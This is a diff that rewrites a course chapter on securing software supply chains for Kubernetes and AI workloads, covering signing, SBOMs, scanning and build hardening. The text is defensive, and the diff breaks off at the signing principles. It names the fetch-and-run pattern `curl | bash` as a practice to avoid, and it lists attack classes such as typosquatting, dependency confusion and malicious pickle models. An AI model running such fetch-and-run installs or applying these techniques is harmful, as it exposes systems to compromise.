@@ -22,21 +22,26 @@ lab_venue: "GCP / GKE"
 
 ## Why this matters for AI infrastructure
 
-AI stacks have one of the widest and least-audited supply chains in computing: multi-gigabyte base images from vendors, thousands of Python packages (PyTorch, CUDA wheels, custom CUDA extensions compiled at install time), pretrained models downloaded from hubs as pickles, datasets scraped from the Internet, build scripts that `curl | bash`, GPU drivers and kernel modules that run with kernel privileges, and notebooks that `pip install` arbitrary things. A compromised dependency in a training image can exfiltrate proprietary data and model weights or tamper with the model itself; a poisoned model file can execute code on load; a malicious package in a CI environment can steal cloud credentials. Kubernetes gives you the control points (admission, network policy, runtime isolation); this chapter shows how to combine them with build-time and registry-time controls into a verifiable chain from source to production, including the AI-specific parts (models, datasets, GPU stack).
+AI stacks have one of the widest and least-audited supply chains in computing. A single training image can pull in a multi-gigabyte base image from a vendor, thousands of Python packages, and PyTorch and CUDA wheels. Some of those wheels compile custom CUDA extensions at install time. Pretrained models often arrive from hubs as pickles, and datasets may have been scraped from the Internet. Build scripts sometimes run `curl | bash`, GPU drivers and kernel modules run with kernel privileges, and notebooks may `pip install` whatever their users type.
+
+Those gaps have real consequences. A compromised dependency in a training image can exfiltrate proprietary data and model weights, or tamper with the model itself. A poisoned model file can execute code the moment it loads. A malicious package in a CI environment can steal cloud credentials.
+
+Kubernetes gives you the control points: admission, network policy and runtime isolation. You can use each of them to stop a bad image before it runs. This chapter shows how to combine them with controls at build time and at the registry. The goal is a verifiable chain from source to production, and that chain includes the AI-specific parts: models, datasets and the GPU stack.
 
 ## Prerequisites and outcomes
 
-Needs 5.1, 5.16, 5.21 and CI/CD basics (4.2). After this chapter you can:
+This chapter builds on 5.1, 5.16 and 5.21, and it assumes the CI/CD basics in 4.2. After this chapter you can:
 
-- Describe the supply-chain threat model (source, build, dependencies, artefacts, registry, deploy, runtime) with real attack classes (typosquatting, dependency confusion, compromised maintainers/build systems, poisoned base images, malicious updates, stolen CI credentials, tampered artefacts, unsigned models) and map controls to each.
-- Explain SLSA levels, in-toto attestations, provenance and how to generate and verify them.
-- Produce and consume SBOMs (SPDX, CycloneDX); scan images and dependencies; manage vulnerability triage with VEX and exceptions.
-- Sign and verify images, SBOMs and attestations with Sigstore/cosign (keyless OIDC and key-based), publish transparency log entries, and enforce verification at admission in Kubernetes.
-- Harden builds (hermetic, ephemeral, least-privilege runners, pinned inputs, reproducibility) and registries (immutability, scanning, replication, access control).
-- Secure Python/ML dependency chains (lockfiles with hashes, private indexes, `--require-hashes`, wheel-only, pinned CUDA stacks), and model/dataset provenance (safetensors, signed model artefacts, hashes, model scanning).
-- Add runtime protections (read-only rootfs, seccomp, egress control, detection) and prepare incident response (blast-radius analysis via SBOMs, key/CI credential rotation, image revocation).
+- Describe the supply-chain threat model across source, build, dependencies, artefacts, registry, deploy and runtime. Name the real attack classes, including typosquatting, dependency confusion, compromised maintainers or build systems, poisoned base images, malicious updates, stolen CI credentials, tampered artefacts and unsigned models, and map a control to each.
+- Explain SLSA levels, in-toto attestations and provenance, and generate and verify them.
+- Produce and consume SBOMs in SPDX and CycloneDX formats, scan images and dependencies, and manage vulnerability triage with VEX and exceptions.
+- Sign and verify images, SBOMs and attestations with Sigstore and cosign, both keyless (OIDC) and key-based. Publish transparency log entries, and enforce verification at admission in Kubernetes.
+
+The last outcomes cover more ground. For builds and registries, you will work with hermetic and ephemeral builds, least-privilege runners, pinned inputs and reproducibility, plus immutability, scanning, replication and access control. For Python and ML, you will work with lockfiles with hashes, private indexes, `--require-hashes`, wheel-only installs and pinned CUDA stacks. You will also handle safetensors, signed model artefacts, hashes and model scanning. For runtime and response, you will apply read-only rootfs, seccomp, egress control and detection. You will also run blast-radius analysis through SBOMs, rotate keys and CI credentials, and revoke images.
 
 ## 1. Threat model
+
+Suppose a developer's account pushes one bad commit. Where would it end up? The diagram traces the path from source to runtime, and the dashed arrows mark the attack points.
 
 ```mermaid
 flowchart LR
@@ -54,46 +59,73 @@ flowchart LR
   A6["Container escape, credential theft, exfiltration"] -.-> RUN
 ```
 
-Representative incidents and lessons (class-level): the SolarWinds build compromise (build system integrity), Codecov bash uploader (modified script harvesting CI secrets), `event-stream`/`ua-parser-js` (maintainer takeover), dependency confusion (internal package names claimed on public indexes), PyPI typosquats of ML libraries, malicious pickle models on public hubs, the `xz` backdoor (long-game maintainer social engineering), compromised GitHub Actions or Docker Hub images, leaked CI tokens used to push images. AI-specific: pickled checkpoints executing code on `torch.load`, compromised conda/pip mirrors, notebook environments with ad-hoc installs, third-party CUDA extension builds, vulnerable inference servers exposed to the network, tampered datasets (poisoning) altering model behaviour.
+A1 is a compromised developer account or a malicious commit. A2 is a compromised CI runner, its secrets or a build plugin. A3 is a typosquat, dependency confusion, a hijacked maintainer or a poisoned model. A4 is a tampered artefact or a registry compromise. A5 is an unverified image that gets deployed, or a malicious controller. A6 is a container escape, credential theft or exfiltration.
 
-Security objectives: **integrity** (what runs is exactly what was built from reviewed source), **provenance** (who/what/how built it), **transparency** (what it contains), **least privilege** (builders and deployers have minimal rights), **detectability** (tampering causes verification failure), **recoverability** (you can find and remove affected artefacts quickly).
+Real incidents show each class at work. The SolarWinds build compromise broke build system integrity. A modified Codecov bash uploader harvested CI secrets. The `event-stream` and `ua-parser-js` cases were maintainer takeovers. Dependency confusion claims internal package names on public indexes. The `xz` backdoor came from long-game maintainer social engineering. Leaked CI tokens used to push images, and compromised GitHub Actions or Docker Hub images, belong in the same list.
+
+The AI-specific cases include pickled checkpoints that execute code on `torch.load`, compromised conda or pip mirrors, and notebook environments with ad-hoc installs. Third-party CUDA extension builds and inference servers exposed to the network also belong here. Tampered datasets, which is data poisoning, can alter model behaviour.
+
+Six objectives follow from these cases. Integrity means what runs is exactly what was built from reviewed source. Provenance records who built an artefact and how. Transparency shows what the artefact contains. Least privilege gives builders and deployers only the rights they need. Detectability makes tampering cause a verification failure. Recoverability means you can find and remove affected artefacts quickly.
+
+Map each attack class to one of these objectives before you choose a control.
 
 ## 2. Frameworks and standards
 
-- **SLSA (Supply-chain Levels for Software Artifacts)**: tracks (Build L1–L3, with source and dependency tracks evolving). Build L1: provenance exists; L2: hosted build platform signs provenance; L3: hardened build platform (isolated builds, non-falsifiable provenance, no secret exposure to user steps). Use the **SLSA GitHub generator** / GitLab / Google Cloud Build provenance, `slsa-verifier` to validate provenance before deploy.
-- **in-toto attestations**: signed statements about artefacts (provenance, SBOM, vulnerability scan, test results, review/approval) in DSSE envelopes with predicates (`https://slsa.dev/provenance/v1`, `https://spdx.dev/Document`, `https://cyclonedx.org/bom`, `https://cosign.sigstore.dev/attestation/vuln/v1`).
-- **Sigstore**: **cosign** (sign/verify OCI artefacts, store signatures as OCI referrers/tags), **Fulcio** (short-lived certs bound to OIDC identities: "keyless"), **Rekor** (public transparency log), **policy-controller** (admission). **Notary v2 / notation** (X.509, enterprise PKI) is the alternative; **OCI 1.1 referrers API** attaches signatures/SBOMs/attestations to images.
-- **NIST SSDF (SP 800-218)**, **CISA/ NSA guidance**, **CNCF supply chain best practices**, **OpenSSF Scorecard**, **CIS benchmarks**, **US EO 14028 SBOM requirements**, **EU Cyber Resilience Act** (SBOMs/vulnerability handling) drive compliance.
-- **Frameworks for AI**: model signing (OpenSSF **model-signing**, Sigstore for models), SBOM extensions for ML (CycloneDX ML-BOM, SPDX AI profile), NIST AI RMF, MLCommons/Hugging Face safetensors guidance.
+You will meet these names in tool documentation and audits, so it helps to know what each one covers.
+
+SLSA, the Supply-chain Levels for Software Artifacts, groups build requirements into levels. Build L1 means provenance exists. Build L2 means a hosted build platform signs the provenance. Build L3 adds isolated builds, non-falsifiable provenance and no exposure of secrets to user steps. Source and dependency tracks are still evolving. Run `slsa-verifier` to check provenance before you deploy.
+
+An in-toto attestation is a signed statement about an artefact, such as its provenance, SBOM, scan results or approval. Attestations travel in DSSE envelopes, and each names a predicate type. Examples include `https://slsa.dev/provenance/v1`, `https://spdx.dev/Document`, `https://cyclonedx.org/bom` and `https://cosign.sigstore.dev/attestation/vuln/v1`.
+
+Sigstore is a set of signing components. Cosign signs and verifies OCI artefacts and stores the signatures as OCI referrers or tags. Fulcio issues short-lived certificates bound to OIDC identities, which is why this is called keyless signing. Rekor is a public transparency log, and the policy-controller enforces these checks at admission. Notary v2, used through `notation`, is the alternative. It works with X.509 certificates and suits enterprise PKI. The OCI 1.1 referrers API attaches signatures, SBOMs and attestations to images.
+
+Several frameworks drive compliance work. NIST SSDF, published as Special Publication 800-218, is one. Others are CISA and NSA guidance, CNCF supply chain best practices, OpenSSF Scorecard and CIS benchmarks. Executive Order 14028 sets SBOM requirements, and the EU Cyber Resilience Act covers SBOMs and vulnerability handling.
+
+For AI workloads, OpenSSF model-signing and Sigstore cover model signing. The CycloneDX ML-BOM and the SPDX AI profile extend SBOMs to ML. NIST AI RMF, along with MLCommons and Hugging Face guidance on safetensors, also applies.
+
+Choose the standards your compliance work requires, and map your tools to them.
 
 ## 3. Source and build
 
+A build is only as trustworthy as the source and the steps around it. This section walks through the controls at each step, starting with the source.
+
 ### Source integrity
 
-Protected branches, required reviews and CODEOWNERS (4.1), signed commits/tags (gitsign for keyless signing), MFA/passkeys for maintainers, secret scanning and push protection, dependency update bots with review, restricted workflow permissions, branch protection for IaC and Dockerfiles, 2-person review for build config. Monitor repository settings drift (OpenSSF Scorecard, `allstar`).
+Protect branches and require reviews. Use CODEOWNERS, covered in 4.1, to name the reviewers. Sign commits and tags, using gitsign for keyless signing. Require MFA or passkeys for maintainers. Turn on secret scanning and push protection. Dependency update bots should open changes that go through review, and workflow permissions should be restricted. Apply branch protection to IaC and Dockerfiles, and require 2-person review for build config. Watch for drift in repository settings with OpenSSF Scorecard and `allstar`.
 
 ### Build integrity
 
-1. **Build in CI, never on developer laptops** for released artefacts; ephemeral, isolated builders (one job per VM/container, destroyed after); no long-lived credentials on runners; OIDC federation to registries/clouds (4.2); least-privilege tokens (push only to the target repository); separate build and deploy credentials.
-2. **Hermetic and pinned inputs**: pin base images by digest, OS packages by version (and snapshot repositories), language dependencies by lockfile with hashes, tools by checksum; vendor or mirror dependencies through an internal proxy (Artifactory/Nexus/devpi/Harbor proxy cache) so builds do not hit the live Internet; deny network egress during the compile phase where possible (BuildKit `--network=none` for steps after dependency fetch; Bazel/Nix hermetic builds).
-3. **Reproducibility**: same inputs → same bits (`SOURCE_DATE_EPOCH`, sorted tar, no timestamps, deterministic ordering, `--build-arg` pins); verify with independent rebuilds (reproducible-builds tooling, `diffoscope`); not always achievable for Python/CUDA stacks but base image + application layers can be.
-4. **Minimal, trusted bases**: distroless/Chainguard/Wolfi, vendor-curated bases (NGC), your own hardened golden bases rebuilt nightly; avoid arbitrary community images; verify base signatures; track base image updates (Renovate) and rebuild dependents.
-5. **Build secrets** only via BuildKit secret mounts (5.1), never baked; **no `curl | bash`** — download with checksum/signature verification.
-6. **Provenance generation**: `docker buildx build --provenance=mode=max --sbom=true`, or SLSA generators, producing attestations attached to the image digest.
-7. **Isolate CI from production**: separate accounts/projects; build agents cannot reach production networks; deploy via GitOps pull (4.26) so CI holds no cluster credentials.
-8. **Protect the CI platform**: pinned and reviewed third-party actions/plugins (by SHA), restricted `pull_request_target`, no secrets for forks, workflow file protection (CODEOWNERS), audit logs, runner hardening, ephemeral self-hosted runners with network egress filtering; treat the CI system as tier-0.
+1. Build released artefacts in CI, never on a developer laptop. Use ephemeral, isolated builders, one job per VM or container, destroyed afterward. Keep long-lived credentials off runners. Federate OIDC to registries and clouds (4.2), and give tokens least privilege, so a token can push only to its target repository. Keep build and deploy credentials separate.
+
+2. Make inputs hermetic and pinned. Pin base images by digest, OS packages by version and snapshot repositories. Lock language dependencies with hashes, and check tools by checksum. Vendor or mirror dependencies through an internal proxy, such as Artifactory, Nexus, devpi or a Harbor proxy cache, so builds never reach the live Internet. Where possible, deny network egress during the compile phase. BuildKit `--network=none` does that for steps that run after the dependency fetch, and Bazel or Nix give you hermetic builds.
+
+3. Reproducibility means the same inputs produce the same bits. Set `SOURCE_DATE_EPOCH`, write sorted tars without timestamps, keep ordering deterministic and pass `--build-arg` pins. Then check the result with independent rebuilds, using reproducible-builds tooling and `diffoscope`. Reproducibility is not always achievable for Python and CUDA stacks, but the base image and application layers usually can be made reproducible.
+
+4. Choose minimal, trusted bases. Options include distroless, Chainguard and Wolfi, vendor-curated bases such as NGC, and your own hardened golden bases rebuilt nightly. Avoid arbitrary community images. Verify base signatures, track base updates with Renovate, and rebuild the images that depend on them.
+
+5. Build secrets belong only in BuildKit secret mounts (5.1), never baked into an image. Never run `curl | bash`. Download files with checksum or signature verification instead.
+
+6. Generate provenance during the build. Running `docker buildx build --provenance=mode=max --sbom=true`, or a SLSA generator, produces attestations attached to the image digest.
+
+7. Isolate CI from production. Use separate accounts or projects, and make sure build agents cannot reach production networks. Deploy through GitOps pull (4.26), so CI holds no cluster credentials.
+
+8. Protect the CI platform itself. Pin third-party actions and plugins by SHA, and review them. Restrict `pull_request_target`, withhold secrets from forks, and protect workflow files with CODEOWNERS. Keep audit logs, harden runners, and use ephemeral self-hosted runners with network egress filtering. Treat the CI system as tier-0.
 
 ### The "Golden Base Image Antipattern"
 
-In traditional virtual-machine operations, security teams often mandate a single pre-approved corporate OS image (for example, a hardened CentOS base) for every workload. When organizations carry that rule into containers by requiring teams to take third-party or vendor container images (such as upstream databases, ingress proxies, or NVIDIA NGC bases) and rebase or repackage them onto the single corporate OS base image, they fall into what *Production Kubernetes* (Chapter 15) calls **the Golden Base Images Antipattern**:
+In traditional virtual-machine operations, security teams often mandate one pre-approved corporate OS image for every workload. A hardened CentOS base is a typical example. Suppose that rule carries over to containers. Teams must then rebase or repackage vendor images, such as upstream databases, ingress proxies or NVIDIA NGC bases, onto the corporate base. *Production Kubernetes*, Chapter 15, calls this the Golden Base Images Antipattern, and it causes two problems.
 
-1. **Broken upstream dependencies and testing**: upstream and vendor images are built and tested against specific libc, runtime, and library versions; rebasing them onto a different corporate OS breaks assumptions and forces teams to reinvent upstream packaging work.
-2. **Unsustainable maintenance sprawl and worse security**: the internal platform team becomes responsible for rebuilding and maintaining forked copies of dozens or hundreds of upstream images. Because manual rebasing is slow and fragile, updates happen infrequently, leaving the fleet on older, more vulnerable software than if they tracked upstream releases.
-3. **Better alternative — codify requirements into pipeline scanning and quarantine registries**: while maintaining a small set of curated internal base images (such as `gcr.io/distroless/base` running as `USER nonroot:nonroot`, or pinned `alpine:3.12` packages like `RUN ["apk", "add", "imagemagick=7.0.10.25-r0"]` in the book's examples) works well for your own first-party applications, third-party/vendor images should instead pass through an automated **quarantine and promotion pipeline** (Section 5) that scans for CVEs, checks non-root user permissions, signs passing images, and pushes them to an approved internal registry.
+The first problem is broken upstream dependencies and testing. Upstream and vendor images are built and tested against specific libc, runtime and library versions. Rebasing them onto a different corporate OS breaks those assumptions, and teams end up reinventing upstream packaging work.
+
+The second problem is maintenance sprawl, which also makes the fleet less secure. The internal platform team must rebuild and maintain forked copies of dozens or hundreds of upstream images. Manual rebasing is slow and fragile, so updates happen infrequently. The fleet then runs older, more vulnerable software than it would if it tracked upstream releases.
+
+The better alternative is to codify requirements into pipeline scanning and quarantine registries. A small set of curated internal base images works well for your own first-party applications, such as `gcr.io/distroless/base` running as `USER nonroot:nonroot`, or pinned `alpine:3.12` packages like `RUN ["apk", "add", "imagemagick=7.0.10.25-r0"]` in the book's examples. Third-party and vendor images should instead pass through the automated quarantine and promotion pipeline in Section 5. That pipeline scans for CVEs, checks non-root user permissions, signs passing images and pushes them to an approved internal registry.
 
 ### In-cluster cloud-native build pipelines with Tekton (`Task` and `Pipeline`)
 
-When running container image builds inside a Kubernetes cluster without mounting the host Docker socket, cloud-native CI tools such as **Tekton** model build steps as Kubernetes Custom Resources (`Task`, `Pipeline`, `TaskRun`, `PipelineRun`) that execute in Pods using rootless builders like Kaniko or Cloud Native Buildpacks (`pack`). In the book's (*Production Kubernetes*, Chapter 15) examples (untested here), a reusable `git-clone` `Task` checks out source code into a shared `Workspace` and records the commit SHA in `$(results.commit.path)`, and a `buildpacks-phases` `Task` runs `/cnb/lifecycle/builder` to produce an OCI image that a `Pipeline` chains together from checkout to registry push:
+Suppose your builds must run inside a cluster without mounting the host Docker socket. Cloud-native CI tools such as Tekton model each build step as a Kubernetes custom resource: `Task`, `Pipeline`, `TaskRun` and `PipelineRun`. Those steps run in Pods, and rootless builders such as Kaniko or Cloud Native Buildpacks (`pack`) do the image build.
+
+In the examples from *Production Kubernetes*, Chapter 15 (untested here), a reusable `git-clone` `Task` checks out source code into a shared `Workspace`. A `buildpacks-phases` `Task` then runs `/cnb/lifecycle/builder` to produce an OCI image. A `Pipeline` chains the two together, from checkout to registry push:
 
 ```yaml
 apiVersion: tekton.dev/v1beta1
@@ -200,62 +232,77 @@ spec:
           value: $(params.builder-image)
 ```
 
+The `git-clone` `Task` writes the exact commit SHA into its result. The `runAfter` setting makes the build wait for the clone, and the shared workspace carries the source from one task to the next. Read the manifests as a single flow, from fetch to build.
+
 ### Cloud Native Buildpacks: no Dockerfile needed
 
-Writing and maintaining a Dockerfile for every service takes developer time. Buildpacks take a different route. They read the source code and decide how to build it, so developers never write a Dockerfile. Heroku and Cloud Foundry have used buildpacks for years. Cloud Native Buildpacks (CNB) brings the idea to containers. It packages the app into an OCI image that runs on Kubernetes.
+Every service with its own Dockerfile is one more file for a developer to write and maintain. Buildpacks skip that step. They read the source code and decide how to build it, so developers never write a Dockerfile. Heroku and Cloud Foundry have used buildpacks for years. Cloud Native Buildpacks, or CNB, brings the idea to containers, packaging the app into an OCI image that runs on Kubernetes.
 
-CNB inspects the source and runs the matching buildpacks. The Go buildpack runs when Go files are present. The Maven buildpack runs when a `pom.xml` file is present. Developers start the process with a CLI called `pack`, and the detection happens behind the scenes. Each buildpack has a narrow scope, so the images it produces tend to follow best practices.
+CNB inspects the source and runs the buildpacks that match it. The Go buildpack runs when Go files are present, and the Maven buildpack runs when a `pom.xml` file is present. You start the process with the `pack` CLI, and detection happens behind the scenes. Each buildpack has a narrow scope, so the images it produces tend to follow best practices.
 
-Platform teams can also write custom buildpacks. Those can enforce policy, meet compliance rules and standardize the images that run on the platform. The value of this grows with the size of the organization, because developers want to build features rather than package containers.
+Platform teams can also write custom buildpacks. A custom buildpack can enforce policy, meet compliance rules and standardize the images that run on the platform. The value grows with the size of the organization, because developers want to build features rather than package containers.
 
 ### Who should own image builds
 
-Early on, developers often write their own Dockerfiles. At scale, that approach creates two problems. Developers lose time they should spend on their product. The images also vary widely, with little standardization. Many organizations therefore move build work to operations and platform teams. Those teams build pipelines that take a code repository as input and return a container image.
+Early on, developers often write their own Dockerfiles. At scale, that approach causes two problems. Developers lose time they should spend on their product, and the images vary widely with little standardization. Many organizations therefore move build work to operations and platform teams. Those teams build pipelines that take a code repository as input and return a container image.
 
-Workshops and hands-on help with Dockerfiles are a reasonable first step. They do not scale well, though, because the ratio of development teams to platform staff is usually high.
+Workshops and hands-on help with Dockerfiles make a reasonable first step. They do not scale well, though, because the ratio of development teams to platform staff is usually high.
 
 ### Triggering builds from commits
 
-Builds should start when code lands in the central repository. Local builds with Docker are fine for early work. Pipeline tools either poll the repositories for changes or receive a webhook from version control. The book's examples use Tekton, a pipeline tool built for Kubernetes. Tekton models each component as a custom resource, and its catalog includes common tasks such as cloning a Git repository.
+Builds should start when code lands in the central repository. Local builds with Docker are fine for early work. A pipeline tool can either poll the repositories for changes or receive a webhook from version control. The examples in the book use Tekton, a pipeline tool built for Kubernetes. Tekton models each component as a custom resource, and its catalog includes common tasks such as cloning a Git repository.
 
-A pipeline can grow from there. It can add tests, linting, static analysis and a signing step. Tasks can also run other build tools, such as Kaniko or BuildKit, when you do not use buildpacks.
+A pipeline can grow from there, adding tests, linting, static analysis and a signing step. When you do not use buildpacks, tasks can run other build tools such as Kaniko or BuildKit.
 
 ### Image tags and metadata
 
-Git hashes make good tags during development. They are not easy to read, but they trace each image back to its commit. As the pipeline matures, add descriptive version tags such as SemVer. Those tags show at a glance which versions run in each environment. Use immutable tags, which most registries support, so nobody overwrites an existing tag.
+During development, Git hashes make good tags. They are hard to read, but each one traces an image back to its commit. As the pipeline matures, add descriptive version tags such as SemVer. Those tags show at a glance which versions run in each environment. Use immutable tags, which most registries support, so nobody can overwrite an existing tag.
 
-Labels with the image owner's contact details and build information help later reporting. Policy tools can also use labels, for example to allow image access only for certain labels.
+Labels that hold the image owner's contact details and build information help later reporting. Policy tools can read labels too. For example, a policy can allow image access only for certain labels.
 
 ### Push-based deploys and their limits
 
-Once builds are automated, the pipeline can deploy as well. The simplest approach is a final step that reads the new tag and runs `kubectl set image`. Many tutorials show this. A better approach edits the Deployment's YAML in version control. The pipeline changes the tag with `sed` or a similar tool, commits the change, and then runs `kubectl apply -f` over the updated manifests. Your YAML then stays close to the source of truth for the cluster.
+Once builds are automated, the pipeline can deploy too. The simplest approach is a final step that reads the new tag and runs `kubectl set image`, and many tutorials show it. A better approach edits the Deployment's YAML in version control. The pipeline changes the tag with `sed` or a similar tool, commits the change, and then runs `kubectl apply -f` over the updated manifests. Your YAML then stays close to the source of truth for the cluster.
 
-The push model has limits. Promoting releases across environments and clusters needs an inventory of targets and credentials for each cluster. If a pipeline is interrupted, someone must restart or reconcile it. Monitor and alert on deployment pipelines as well, so failures do not go unnoticed.
+The push model has limits. Promoting releases across environments and clusters needs an inventory of targets, plus credentials for each cluster. If a pipeline is interrupted, someone must restart or reconcile it. Monitor and alert on deployment pipelines too, so failures do not go unnoticed. Decide who holds cluster credentials before you automate the push.
 
 ## 4. SBOMs and vulnerability management
 
 ### SBOM
 
-A **Software Bill of Materials** lists components (packages, versions, licences, hashes, supplier, relationships). Formats: **SPDX** (ISO standard), **CycloneDX** (OWASP; VEX and ML-BOM support). Generate at build with **Syft** (`syft packages registry/app@sha256:... -o spdx-json`), BuildKit `--sbom`, Trivy (`trivy image --format cyclonedx`), language tools (`pip-audit`, `cyclonedx-py`), `docker sbom`. Attach as attestation (`cosign attest --type spdxjson --predicate sbom.json image@digest`) and store in the registry (referrers). Use SBOMs to answer "which running workloads contain log4j / this torch version / this OpenSSL?" instantly: ingest into a database (Dependency-Track, GUAC, Grype with SBOM input) and cross-reference with deployed digests from the cluster (`kubectl get pods -A -o jsonpath` images → digests).
+A Software Bill of Materials, or SBOM, lists the components inside an artefact. The list covers packages, versions, licences, hashes, suppliers and relationships. Two common formats are SPDX, an ISO standard, and CycloneDX, which comes from OWASP and supports VEX and ML-BOM. You can generate an SBOM at build time. Syft does it with `syft packages registry/app@sha256:... -o spdx-json`. Other options include BuildKit's `--sbom`, `trivy image --format cyclonedx`, language tools such as `pip-audit` and `cyclonedx-py`, and `docker sbom`.
+
+Attach the SBOM to the image as an attestation with `cosign attest --type spdxjson --predicate sbom.json image@digest`, and store it in the registry as a referrer.
+
+The payoff comes when something breaks. An SBOM lets you answer "which running workloads contain log4j, this torch version or this OpenSSL?" within moments. Ingest SBOMs into a database such as Dependency-Track or GUAC, or use Grype with SBOM input. Then cross-reference the results with the digests running in your cluster. You can list those with `kubectl get pods -A -o jsonpath`.
 
 ### Scanning
 
-- **Image scanners**: Trivy, Grype, Clair, Snyk, Docker Scout, cloud-native (ECR/Artifact Registry/ACR scanning), Anchore. Scan OS packages and language ecosystems (pip, npm, Go modules, Java); note limitations: wheels with bundled libs (PyTorch bundles CUDA libs), statically linked binaries, vendored code, and compiled CUDA extensions are hard to attribute; false positives from distro backports.
-- **Where to scan**: PR time (Dockerfile lint `hadolint`, dependency review), build time (fail on critical/high with fixes available), registry (continuous rescans as new CVEs emerge), cluster (Trivy Operator / Kubescape scanning running workloads), nodes (host packages, kernel).
-- **Triage with context**: reachability, exploitability (EPSS, CISA KEV), whether the component is loaded, mitigations; record decisions with **VEX** (Vulnerability Exploitability eXchange) statements (OpenVEX/CSAF/CycloneDX VEX) so scanners suppress not-affected findings with justification; time-bound exceptions with owners.
-- **Patch SLAs**: critical (hours to days), high (days to weeks), with automated rebuild pipelines for bases; image freshness policy (max age) enforced by admission or reporting.
-- **Config and IaC scanning**: Trivy config/Checkov/Kubescape for manifests and Terraform (4.2, 4.23); secrets scanning (gitleaks, trufflehog) on repos, images, and registries.
-- **GPU stack CVEs**: NVIDIA publishes security bulletins for drivers, Container Toolkit, GPU Operator, Triton, NeMo, DCGM; track and patch (container toolkit escape CVEs have occurred: update promptly and restrict `privileged`).
+Several image scanners are available. Trivy, Grype, Clair, Snyk, Docker Scout and Anchore all work here, and so do the cloud-native scanners in ECR, Artifact Registry and ACR. They scan OS packages and language ecosystems such as pip, npm, Go modules and Java. Be aware of the limits. Wheels with bundled libraries, such as PyTorch with its CUDA libraries, are hard to attribute. So are statically linked binaries, vendored code and compiled CUDA extensions. Distro backports can also cause false positives.
+
+Scan at several points. At PR time, lint the Dockerfile with `hadolint` and review dependencies. At build time, fail the build on critical or high findings that have fixes available. The registry can rescan continuously as new CVEs emerge. In the cluster, Trivy Operator or Kubescape can scan running workloads, and nodes need checks on host packages and the kernel.
+
+Triage needs context. Ask whether the vulnerable code is reachable, how exploitable it is (EPSS and CISA KEV help here), whether the component is loaded and what mitigations exist. Record each decision as a VEX, which stands for Vulnerability Exploitability eXchange, statement. Use OpenVEX, CSAF or CycloneDX VEX format. Scanners can then suppress findings marked not affected, with the justification attached. Give each exception an owner and a time limit.
+
+Set patch SLAs by severity. Critical findings may need a fix within hours to days, and high findings within days to weeks. Automated rebuild pipelines keep base images current. Add an image freshness policy with a maximum age, and enforce it through admission or reporting.
+
+Scan configuration and infrastructure code too. Trivy config, Checkov and Kubescape check manifests and Terraform (see 4.2 and 4.23). Secret scanners such as gitleaks and trufflehog check repositories, images and registries.
+
+The GPU stack has its own CVEs. NVIDIA publishes security bulletins for drivers, the Container Toolkit, the GPU Operator, Triton, NeMo and DCGM, and you need to track and patch them. Container Toolkit escape CVEs have occurred, so update promptly and restrict `privileged`.
 
 ### Scanning over time without causing outages
 
-Scanning at pull time is a useful start. But images already in your environment can gain new CVEs. Schedule rescans, and plan how you will update or replace the affected images. Automatic patching is tempting, yet an updated image can be incompatible and break a running app. Automated updates can also bypass your change process, which makes them hard to audit.
+Scanning at pull time is a useful start, but images already in your environment can gain new CVEs. Schedule rescans, and plan how you will update or replace the affected images. Automatic patching is tempting, yet an updated image can be incompatible and break a running app. Automated updates can also bypass your change process, which makes them hard to audit.
 
-Blocking pulls has a cost too. Suppose a core application's image gets a new CVE and pulls are blocked. Pods scheduled to new nodes then cannot start. That trade-off pits security against availability, so write down the decision. Most teams prefer alerts. A registry can call a webhook when a scan completes, or expose metrics that you can scrape and alert on. Once you know the impact, decide whether and when to patch. Then run the patch through your normal pipeline, so the change stays transparent and auditable.
+Blocking pulls has a cost too. Suppose a core application's image gets a new CVE and pulls are blocked. Pods scheduled to new nodes then cannot start. That trade-off pits security against availability, so write the decision down. Most teams prefer alerts. A registry can call a webhook when a scan completes, or expose metrics that you can scrape and alert on. Once you know the impact, decide whether and when to patch, then run the patch through your normal pipeline so the change stays transparent and auditable.
+
+Write down whether you block pulls or alert on findings, and run every patch through your normal pipeline.
 
 ## 5. Signing and verification
 
 ### Cosign basics
+
+Before you sign anything, look at what the commands look like in a real pipeline. The block below shows keyless signing in CI, verification with identity constraints, and a key-based variant for air-gapped or KMS setups.
 
 ```bash
 # Keyless signing in CI (GitHub Actions with id-token: write)
@@ -273,11 +320,15 @@ cosign generate-key-pair --kms gcpkms://projects/p/locations/global/keyRings/r/c
 cosign sign --key gcpkms://... image@digest ; cosign verify --key gcpkms://.../versions/1 image@digest
 ```
 
-Principles: **sign digests, not tags**; define **who is allowed to sign** (identity = CI workflow path + ref, not "any signature"); keep a **private Sigstore** (Fulcio/Rekor/TUF) or key-based/KMS signing for air-gapped environments; protect signing keys in KMS/HSM; set certificate-identity policies tightly; record verification policy as code; sign **all** artefacts: images, Helm charts (OCI), SBOMs, attestations, Terraform modules, models.
+The first three commands sign the digest and attach provenance and SBOM attestations to it. The verify commands are where the policy lives, because they accept only the identity you name.
 
-As *Production Kubernetes* Chapter 15 (*Software Supply Chain*) explains, early container signing with **Notary v1 (Docker Content Trust / TUF)** had two major operational pain points that modern **Sigstore (`cosign`)** and **Notary v2 (`notation`)** solved:
-1. **The Globally Unique Name (`GUN`) registry-URL coupling problem (`PK` Chapter 15):** Notary v1 bound each signature to a **Globally Unique Name (`GUN`)** that included the **registry hostname URL** (`registry-a.example.com/team/app`). Whenever an enterprise replicated or cached that exact same image digest across regional registries, edge pull-through caches, or air-gapped mirrors (`registry-b.internal/team/app`), Notary v1 signatures broke because the registry URL changed. By signing the **content-addressable image manifest digest (`@sha256:...`)** and storing signatures as OCI 1.1 artifacts/referrers inside the registry itself, `cosign` and `notation` allow signatures and SBOM attestations to travel seamlessly across mirrors and regional caches.
-2. **Push-Based vs. Pull-Based (GitOps) Deployments and Progressive Traffic Shifting (`Flagger`, `PK` Chapter 15):** After an image passes build, CVE scanning (`Clair` / `Trivy`), signing, and promotion to the `approved` registry, `PK` Chapter 15 recommends **pull-based GitOps controllers (`Flux` / `Argo CD`)** over push-based CI `kubectl apply` scripts (so CI never holds cluster-admin credentials), paired with **progressive delivery controllers (`Flagger` or `Argo Rollouts`)** that shift traffic gradually (`Canary`, `Blue/Green`, or `A/B Testing`) via Ingress/Gateway API or Service Mesh weights and automatically abort/roll back if error rates or latency degrade.
+Several principles follow from these commands. Sign digests, not tags. Define who is allowed to sign, using the CI workflow path and ref as the identity rather than accepting any signature. For air-gapped environments, run a private Sigstore made of Fulcio, Rekor and TUF, or use key-based signing with KMS. Protect signing keys in KMS or an HSM, set certificate-identity policies tightly and record the verification policy as code. Sign all artefacts, including images, OCI Helm charts, SBOMs, attestations, Terraform modules and models.
+
